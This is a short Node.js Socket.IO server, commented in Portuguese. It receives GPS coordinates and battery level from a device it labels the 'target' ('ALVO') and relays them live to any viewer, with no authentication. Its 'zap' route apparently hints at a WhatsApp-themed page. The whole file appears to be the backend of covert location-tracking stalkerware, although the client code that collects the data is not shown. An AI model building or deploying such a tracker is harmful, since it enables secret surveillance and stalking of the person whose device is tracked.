const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: { origin: "*" }
});
const path = require('path');

// --- CORREÇÃO DE CAMINHOS PARA O RENDER ---
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// --- ROTAS ---
app.get('/', (req, res) => res.render('home'));
app.get('/gps', (req, res) => res.render('gps'));
app.get('/zap', (req, res) => res.render('zap'));

// --- MEMÓRIA ---
let lastKnownData = null;

io.on('connection', (socket) => {
    const role = socket.handshake.query.role;

    if (role === 'target') {
        console.log(`[ALVO CONECTADO] ID: ${socket.id}`);
        
        socket.on('report_location', (data) => {
            lastKnownData = {
                deviceId: "ALVO_01",
                lat: data.lat,
                lng: data.lng,
                battery: data.battery,
                status: "ONLINE",
                timestamp: new Date().toLocaleTimeString()
            };
            io.emit('gps_update', lastKnownData);
        });

        socket.on('disconnect', () => {
             if(lastKnownData) lastKnownData.status = "OFFLINE";
             io.emit('target_status', { status: 'OFFLINE' });
        });

    } else {
        if (lastKnownData) {
            socket.emit('gps_update', lastKnownData);
        }
    }
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`[SISTEMA] Rodando na porta ${PORT}`);
});